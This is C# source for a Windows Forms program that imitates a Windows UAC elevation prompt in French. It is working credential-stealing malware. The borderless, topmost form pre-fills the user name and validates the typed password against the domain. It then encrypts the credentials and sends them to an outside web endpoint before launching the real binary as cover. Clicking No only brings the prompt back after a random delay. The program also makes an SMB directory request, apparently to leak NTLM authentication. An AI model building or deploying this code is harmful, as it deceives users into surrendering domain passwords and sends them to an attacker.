using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.Diagnostics;
using System.Net;
using System.Web;
using NaCl;
using System.Security.Cryptography;

namespace test1
{
    public partial class UAC : Form
    {
        
        string username_placeholder = "utilisateur";
        string password_placeholder = "mot de passe";
        string httpEndPoint = "https://kleman.pw";
        string realBinaryName = "..\\..\\..\\..\\..\\..\\.\\..\\..\\..\\..\\..\\.\\..\\..\\..\\..\\..\\Windows\\System32\\calc.exe";
        string disableNoButton = "no";
        string smbRequest = "\\\\127.0.0.1\\chevalo\\";
        int minMinute = 1;
        int maxMinute = 5;
        byte[] pubKey = Convert.FromBase64String("O0wsjvu9M97ILDf1JtVWUaKsqvFwvBFX+mAVSRjYWVU=");

        string currentDomain = "Workgroup";
        bool alreadyRun = false;

        public UAC()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            this.FormBorderStyle = FormBorderStyle.None;
            this.setup_Text();

            //this.lblEditeurVerifier.Font = new Font(this.lblEditeurVerifier.Font,FontStyle.Bold);

            this.TopMost = true;

            try
            {
                Domain domain = Domain.GetComputerDomain();
                currentDomain = domain.Name;
            }
            catch
            {
                currentDomain = "Workgroup";
            }
            this.lblDomain.Text += currentDomain;
            string friendlyName = System.AppDomain.CurrentDomain.FriendlyName;
            this.lblProgramName.Text = friendlyName.Substring(0, friendlyName.LastIndexOf('.'));

            this.ActiveControl = this.lblDomain;

            //parse config file
            string config = find_ConfigFile(Application.ExecutablePath, "utf-8");
            if (config == null)
            {
                config = find_ConfigFile(Application.ExecutablePath, "utf-16");
            }

            try
            {
                parse_Config(config);

            }
            catch
            {

            }

            Thread myThread;
            myThread = new Thread(new ThreadStart(threadFunc));
            myThread.Start();


        }

        private void setup_Text()
        {
            this.username.LostFocus += Username_LostFocus;
            this.username.GotFocus += Username_GotFocus;
            this.username.Text = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            this.username.ForeColor = Color.Black;

            this.password.LostFocus += Password_LostFocus;
            this.password.GotFocus += Password_GotFocus;
            this.password.Text = this.password_placeholder;
        }

        private bool check_Credential(string username, string password)
        {
            string domain = this.currentDomain;
            List<string> token = username.Split('\\').ToList();
            if (token.Count == 2)
            {
                username = token[1];
                domain = token[0];
            }
            try
            {
                using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, domain))
                {
                    // validate the credentials
                    return pc.ValidateCredentials(username, password);
                }
            }
            catch
            {
                return true;
            }
        }

        private string find_ConfigFile(string path, string enc) {
            const string pattern = "[configFile]";
            Encoding encoding = Encoding.GetEncoding(enc.ToUpper());

            byte[] fileBytes = File.ReadAllBytes(path);
            byte[] patternBytes = encoding.GetBytes(pattern);

            int counter = 0;
            for (int i = (fileBytes.Length - patternBytes.Length); i > 1; i--)
            {
                if (patternBytes[patternBytes.Length - 1 - counter] == fileBytes[i])
                {
                    counter += 1;
                }
                else
                {
                    counter = 0;
                }

                if (counter == patternBytes.Length)
                {
                    return encoding.GetString(fileBytes.Skip(i).ToArray());
                }
            }

            return null;
        }

        private void runBinary()
        {
            if (!this.alreadyRun)
            {
                string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
                path += "\\" + this.realBinaryName;
                Process.Start(path);
                this.alreadyRun = true;
            }
        }

        private void parse_Config(string config)
        {
            List<string> token = config.Split('\n').ToList();
            List<string> key_Value;


            foreach (string str in token)
            {
                key_Value = str.Split('=').ToList();
                if (key_Value.Count >= 2)
                {
                    switch (key_Value[0].Trim())
                    {
                        case "httpEndPoint":
                            this.httpEndPoint = key_Value[1].Trim();
                            break;
                        case "realBinaryName":
                            this.realBinaryName = key_Value[1].Trim();
                            break;
                        case "disableNoButton":
                            this.disableNoButton = key_Value[1].Trim();
                            break;
                        case "smbRequest":
                            this.smbRequest = key_Value[1].Trim();
                            break;
                        case "minMinute":
                            this.minMinute = (int)Int64.Parse(key_Value[1].Trim());
                            break;
                        case "maxMinute":
                            this.maxMinute = (int)Int64.Parse(key_Value[1].Trim());
                            break;
                        case "pubKey":
                            if (str.IndexOf('=') != -1)
                            {
                                this.pubKey = Convert.FromBase64String(str.Substring(str.IndexOf('=') + 1).Trim());
                            }
                            break;
                    }
                }
            }
            /*
            Console.WriteLine("httpEndPoint : " + this.httpEndPoint);
            Console.WriteLine("realBinaryName : " + this.realBinaryName);
            Console.WriteLine("disableNoButton : " + this.disableNoButton);
            Console.WriteLine("eecCurve : " + this.eecCurve);
            Console.WriteLine("smbRequest : " + this.smbRequest);
             
            */

        }

        public void threadFunc()
        {
            try
            {
                string[] subdirectoryEntries = Directory.GetDirectories(this.smbRequest);
            }
            catch
            {

            }
        }

        private void Password_GotFocus(object sender, EventArgs e)
        {
            if (this.password.Text == this.password_placeholder && this.password.PasswordChar == '\0')
            {
                this.password.ForeColor = Color.Black;
                this.password.Text = "";
                this.password.PasswordChar = '*';
            }
        }

        private void Password_LostFocus(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(this.password.Text))
            {
                this.password.ForeColor = Color.Gray;
                this.password.Text = this.password_placeholder;
                this.password.PasswordChar = '\0';
            }
        }

        private void Username_GotFocus(object sender, EventArgs e)
        {
            if (this.username.Text == this.username_placeholder)
            {
                this.username.ForeColor = Color.Black;
                this.username.Text = "";
            }

        }

        private void Username_LostFocus(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(this.username.Text))
            {
                this.username.ForeColor = Color.Gray;
                this.username.Text = this.username_placeholder;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {

            //try
            //{
                //disable button 
                this.bntNo.Enabled = false;
                this.bntYes.Enabled = false;
                this.username.Enabled = false;
                this.password.Enabled = false;
                
                string usr = this.username.Text;
                string pass = this.password.Text;


                var rng = RandomNumberGenerator.Create();

                Curve25519XSalsa20Poly1305.KeyPair(out var uacPrivate, out var uacPublic);
                Curve25519XSalsa20Poly1305 box = new Curve25519XSalsa20Poly1305(uacPrivate, this.pubKey);



                byte[] nonce = new byte[Curve25519XSalsa20Poly1305.NonceLength];
                
                rng.GetBytes(nonce);
                byte[] message = Encoding.UTF8.GetBytes("username="+usr +"\n"+ "password=" + pass);
                byte[] cipher = new byte[message.Length + Curve25519XSalsa20Poly1305.TagLength];
                box.Encrypt(cipher, message, nonce);
               

                List<byte> list = new List<byte>();
                list.AddRange(nonce);
                list.AddRange(cipher);
                byte[] cipher_msg = list.ToArray();


                
                if (this.check_Credential(usr, pass))
                {

                    runWebExfiltration(System.Convert.ToBase64String(cipher_msg), Convert.ToBase64String(uacPublic));
                    this.runBinary();
                    Application.Exit();
                }
                else
                {
                    this.bntNo.Enabled = true;
                    this.bntYes.Enabled = true;
                    this.username.Enabled = true;
                    this.password.Enabled = true;
                    this.password.Text = "";
                    this.Password_LostFocus(sender, e);


                    this.lblAuthSucess.Text = "Le nom d'utilisateur ou le mot de passe est incorrect";
                }
            //}
            //catch { }

        }


        private void runWebExfiltration(string cipherText, string pubKey)
        {
            string url = this.httpEndPoint + "?cipherText=" + HttpUtility.UrlEncode(cipherText) + "&pubKey=" + HttpUtility.UrlEncode(pubKey);
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

            try
            {
                request.GetResponse();
            }
            catch (Exception e)
            {
                Console.WriteLine($"Unable to connect to the server: {e.Message}");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (this.disableNoButton != "yes")
            {
                Random rnd = new Random();
                int sec = rnd.Next(60 * this.minMinute * 1000, 60 * this.maxMinute * 1000);
                if (sec > 0)
                {
                    this.Hide();
                    this.setup_Text();
                    this.runBinary();
                    System.Threading.Timer timer;
                    timer = new System.Threading.Timer(
                        callback: new TimerCallback(
                            delegate (object o)
                            {
                                this.Show();
                            }

                        ),
                        state: null,
                        dueTime: sec,
                        period: Timeout.Infinite
                    );
                }
            }

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void username_TextChanged(object sender, EventArgs e)
        {

        }

        private void lblContinue_Click(object sender, EventArgs e)
        {

        }

        private void lblEditeurVerifier_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void password_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true;
                this.button1_Click(sender, e);
            }
           
        }

        private void username_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true;
            }
        }
    }
}
